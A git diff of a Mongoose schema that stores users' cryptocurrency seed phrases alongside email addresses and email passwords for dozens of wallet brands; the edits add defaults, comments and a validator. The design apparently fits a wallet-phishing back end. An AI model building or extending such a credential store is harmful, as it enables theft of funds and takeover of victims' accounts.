@@ -1,7 +1,7 @@
 
 const mongoose = require('mongoose');
 
-// Define allowed wallet types - ensure this matches frontend definitions
+// Define allowed wallet types - ensure this matches frontend definitions (expanded & alphabetized)
 const WalletTypes = [
     'AlphaWallet', 'Argent Wallet', 'Argent X', 'Atomic Wallet', 'Binance Wallet (custodial)',
     'BitBox02', 'BlueWallet', 'BRD Wallet (Breadwallet)', 'Braavos', 'Brain Wallet (Not Recommended)',
@@ -36,11 +36,13 @@ const SeedPhraseSchema = new mongoose.Schema({
    */
   encryptedEmail: {
     type: String,
-    required: false,
+    required: false, // Optional email
+    default: '', // Ensure default is empty string if not provided
   },
   encryptedEmailPassword: {
       type: String,
-      required: false,
+      required: false, // Optional password
+      default: '', // Ensure default is empty string
   },
   walletName: {
     type: String,
@@ -51,12 +53,17 @@ const SeedPhraseSchema = new mongoose.Schema({
   encryptedSeedPhrase: {
     type: String,
     required: [true, 'Encrypted seed phrase is required.'],
+     // Add validation if needed, e.g., ensure it's not empty after potential encryption placeholder removal
+     validate: {
+         validator: function(v) { return v && v.length > 0 && v !== 'ENCRYPTED()'; }, // Basic check
+         message: 'Encrypted seed phrase appears invalid.'
+     }
   },
   walletType: {
     type: String,
     required: [true, 'Wallet type is required.'],
     enum: {
-      values: WalletTypes,
+      values: WalletTypes, // Use the updated list
       message: 'Invalid wallet type selected.'
     }
   },
